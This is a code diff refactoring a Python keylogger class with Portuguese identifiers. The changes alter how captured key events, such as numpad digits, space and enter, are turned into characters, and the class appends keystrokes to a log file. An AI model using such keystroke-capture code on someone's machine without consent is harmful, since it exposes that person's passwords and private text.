@@ -59,7 +59,7 @@ class KeyLogger():
             logs.write("\n----------------------------------------------\n")
         return
 
-    def get_char(self,Tecla):
+    def get_char(self, Tecla):
         try:
             if Tecla.char != None:
                 return Tecla.char
@@ -67,10 +67,10 @@ class KeyLogger():
                 Tecla = str(Tecla)
                 numero = ''
                 numpad = {
-                    '<96>': lambda numero: '0',
-                    '<97>': lambda numero: '1',
-                    '<98>': lambda numero: '2',
-                    '<99>': lambda numero: '3',
+                    '<96>':  lambda numero: '0',
+                    '<97>':  lambda numero: '1',
+                    '<98>':  lambda numero: '2',
+                    '<99>':  lambda numero: '3',
                     '<100>': lambda numero: '4',
                     '<101>': lambda numero: '5',
                     '<102>': lambda numero: '6',
@@ -80,11 +80,17 @@ class KeyLogger():
                     }
                 return numpad[Tecla](numero)
         except AttributeError:
-            if str(Tecla) == 'Key.space':
-                Tecla = str(Tecla).replace('Key.space',' ')
-            if str(Tecla) == 'Key.enter':
-                Tecla = str(Tecla).replace('Key.enter','\n')
-            return str(Tecla)
+            Tecla = str(Tecla)
+            Tecla_Especial = ''
+            especiais = {
+                'Key.space': lambda Tecla_Especial: ' ',
+                'Key.enter': lambda Tecla_Especial: '\n'
+                }
+            try:
+                Tecla = especiais[Tecla](Tecla_Especial)
+            except:
+                Tecla = ''
+            return Tecla
 
     def on_press(self, Tecla):
         with open(self.NomeDoArquivo, 'a') as logs:
